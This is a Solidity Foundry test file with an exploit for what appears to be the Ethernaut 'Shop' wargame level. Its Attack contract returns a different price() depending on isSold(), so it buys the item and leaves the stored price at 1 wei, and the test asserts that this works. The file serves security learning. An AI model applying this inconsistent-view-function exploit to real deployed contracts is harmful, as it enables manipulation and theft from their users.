// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/21_Shop.sol";

contract ShopTest is Test {
    Shop instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);

        instance = new Shop();

        attacker = new Attack(address(instance));
    }

    function testattacker() public {
        vm.startPrank(player1, player1);
        attacker.attack();
        assertEq(instance.price(), 1 wei);
        assertEq(instance.isSold(), true);
        vm.stopPrank();
    }
}

interface IShop {
    function isSold() external view returns (bool);

    function buy() external;
}

contract Attack {
    IShop shop;

    constructor(address _shop) {
        shop = IShop(_shop);
    }

    function price() public view returns (uint256) {
        return shop.isSold() ? 1 : 101;
    }

    function attack() public {
        shop.buy();
    }
}
